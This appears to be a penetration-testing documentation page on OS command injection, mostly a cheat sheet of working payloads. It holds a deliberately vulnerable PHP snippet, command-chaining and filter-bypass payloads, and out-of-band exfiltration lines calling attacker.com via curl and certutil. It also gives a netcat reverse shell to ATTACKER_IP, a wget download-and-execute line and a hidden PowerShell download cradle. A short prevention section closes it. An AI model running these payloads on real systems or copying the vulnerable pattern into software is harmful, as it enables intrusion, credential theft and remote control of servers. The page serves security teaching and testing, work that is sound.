---
sidebar_position: 20
---
# Command Injection


Command Injection (also known as OS Command Injection) is an attack where the attacker executes arbitrary operating system commands on the host server by injecting them into an application's input fields. This vulnerability arises when a web application passes unsanitized user-supplied data to a system shell, allowing attackers to manipulate the commands executed by the server. This can lead to full system compromise.

## How Command Injection Works

Applications often need to interact with the underlying operating system to perform tasks like running external programs, listing files, or executing system utilities. If user input is directly incorporated into these commands without proper validation or sanitization, an attacker can append their own commands.

**Example of a Vulnerable Code (PHP):**
```php
$filename = $_GET['filename'];
$command = "cat " . $filename; // or "ls " . $filename
shell_exec($command);
```
If an attacker provides `filename=image.jpg; id`, the command becomes:
```bash
cat image.jpg; id
```
The server will first execute `cat image.jpg` and then, critically, execute `id`, revealing information about the user running the web server process.

## Why Command Injection is Critical

*   **Full System Compromise**: Attackers can execute arbitrary commands, including installing backdoors, creating new user accounts, or completely wiping data.
*   **Data Exfiltration**: Access and steal sensitive files from the server (e.g., `/etc/passwd`, database credentials).
*   **Privilege Escalation**: Identify and exploit misconfigurations or vulnerabilities on the compromised server to gain higher privileges.
*   **Network Pivoting**: Use the compromised server as a pivot point to attack other internal systems.

## Detecting and Exploiting Command Injection

Detection often involves injecting special characters used by the command-line interface to chain commands. Observing the application's response (e.g., seeing the output of your injected command, or a time delay) confirms the vulnerability.

### Command Chaining Characters (Linux/Unix-like Systems)

These characters allow attackers to chain multiple commands.

#### `;` (Semicolon) 
Executes the next command regardless of the success of the previous one.  

*   **Payload**: `example.jpg; id`
*   **Resulting Command**: `cat example.jpg; id`
*   **Expected Output**: Output of `cat` followed by the output of `id`.

#### `&` (Ampersand)
Executes the next command in the background, or if used with another `&` (`&&`), executes the next command only if the previous one succeeded.  

*   **Payload**: `example.jpg & id`
*   **Resulting Command**: `cat example.jpg & id` (runs `id` concurrently)
*   **Payload**: `example.jpg && id`
*   **Resulting Command**: `cat example.jpg && id` (runs `id` only if `cat` succeeds)
#### `|` (Pipe)
Takes the output of the first command and uses it as input for the second command.  

*   **Payload**: `example.jpg | id`
*   **Resulting Command**: `cat example.jpg | id` (Output of `cat` is piped to `id`. May or may not produce useful output depending on the context).  
#### `||` (Double Pipe)
Executes the next command only if the previous one failed.  

*   **Payload**: `example.jpg || id`
*   **Resulting Command**: `cat example.jpg || id`
#### `` ` `` (Backticks)
Executes the enclosed command and substitutes its output into the current command.  

*   **Payload**: `` example.jpg `id` ``
*   **Resulting Command**: `cat example.jpg $(id)` (If `id` output is `uid=1000`, the command becomes `cat example.jpg uid=1000`)

#### `$(command)` (Command Substitution)
Similar to backticks, often preferred for clarity and nesting.  
*   **Payload**: `example.jpg $(id)`
*   **Resulting Command**: `cat example.jpg $(id)`

### Command Chaining Characters (Windows Systems)

#### `&` (Ampersand)
Executes the next command regardless.

*   **Payload**: `example.jpg & whoami`
*   **Resulting Command**: `type example.jpg & whoami`
#### `&&` (Double Ampersand)
Executes the next command only if the previous one succeeded.  

*   **Payload**: `example.jpg && whoami`  

#### `|` (Pipe)
Output of first command becomes input for the second.  

*   **Payload**: `example.jpg | whoami`

#### `||` (Double Pipe)
Executes the next command only if the previous one failed.  

*   **Payload**: `example.jpg || whoami`

### Bypassing Input Filters

If an application filters certain characters, try alternative methods:

#### Newlines (`%0a` or `\n`)
Many command interpreters treat newlines as command separators.  
*   **Payload**: `example.jpg%0aid` (URL encoded)

#### Comments (`#` or `//`)
Use comments to terminate the original command and prevent errors from subsequent parts.
*   **Payload**: `example.jpg | id #`

#### Base64 Encoding
Some applications might decode Base64 before execution.  

*   **Payload**: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash` (for `cat /etc/passwd`) 

#### Using different commands
If `cat` is blocked, try `more`, `less`, `tail`, `head`, `strings`.  

**Wildcards**: If spaces are filtered, use `{id,}` or globbing.  

    *   **Payload**: `echo${IFS}a;id` or `id${IFS}example.jpg`  

**Environment Variables**: Use variables to break up commands.  
    *   **Payload**: `a=i;b=d;$a$b` (executes `id`)  

### Blind Command Injection (Time-based or Out-of-band)

If the application doesn't return command output directly, you can still detect and exploit it.

#### Time-based (Linux)
*   **Payload**: `example.jpg; sleep 5;`
*   **Expected Behavior**: The page takes 5 seconds longer to load.

#### Time-based (Windows)
*   **Payload**: `example.jpg & ping -n 5 127.0.0.1 &`
*   **Expected Behavior**: The page takes 5 seconds longer to load.

#### Out-of-band (DNS or HTTP callback)
*   **Payload**: `example.jpg; curl http://attacker.com?data=$(whoami)` (Linux)
*   **Payload**: `example.jpg & certutil -urlcache -f http://attacker.com/$(whoami) &` (Windows, less reliable)
*   **Expected Behavior**: Your attacker-controlled server (`attacker.com`) receives a request containing the output of `whoami`. Tools like Burp Collaborator or a simple Python HTTP server can capture this.

## Exploitation Examples

### Linux/Unix

#### Read `/etc/passwd`
`example.jpg; cat /etc/passwd`  

#### Check current user  
`example.jpg; whoami`  

#### List directory contents
`example.jpg; ls -la /`  

#### Create a reverse shell (Netcat)
On attacker: `nc -lvnp 9001`  

Payload (URL encoded if in GET parameter): `example.jpg; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 9001 >/tmp/f`  

#### Download and execute a script
`example.jpg; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh`

### Windows

#### Check current user
`example.jpg & whoami`

#### List directory contents
`example.jpg & dir C:\`  

#### Read a sensitive file
`example.jpg & type C:\Windows\System32\drivers\etc\hosts`  

#### Create a reverse shell (PowerShell)
On attacker: `nc -lvnp 9001`  

Payload: `example.jpg & powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/shell.ps1');"` (where `shell.ps1` contains a PowerShell reverse shell script).

## Tools for Exploitation

#### Commix (Automated OS Command Injection and Exploitation Tool)
A powerful open-source tool that automates the detection and exploitation of command injection vulnerabilities.  

**Basic Usage**:
        ```bash
        commix --url="http://example.com/vulnerable?param=test" --batch
        ```
*   **`--url`**: Target URL.
*   **`--data`**: If injecting into POST data.
*   **`--cookie`**: If injecting via cookie.
*   **`--os-shell`**: Attempt to get an interactive OS shell.
*   **`--file-read <path>`**: Read a remote file.
*   **`--file-write <local_path> --file-dest <remote_path>`**: Write a local file to the remote server.
*   **`--blind=time`**: Force time-based blind detection.
*   **`--proxy="http://127.0.0.1:8080"`**: Use a proxy like Burp Suite.

#### Burp Suite (Manual Testing & Automation with Intruder)
**Manual Testing**: Inject payloads directly into parameters.  

**Intruder**: Use Intruder with a custom wordlist of command injection payloads and observe varying response lengths or time delays to identify vulnerabilities.  

## Prevention (Briefly)

**Avoid System Calls with User Input**: The best defense is to avoid invoking OS commands directly with user-supplied input.  
**Input Validation**: Strictly validate and sanitize all user input. Use whitelists (only allow known good inputs) instead of blacklists.  
**Least Privilege**: Run applications with the absolute minimum necessary permissions.  
**Safe API Alternatives**: Use safer, built-in API functions (e.g., `exec()` or `system()` with a fixed command and separate, validated arguments) instead of concatenating strings for system calls.  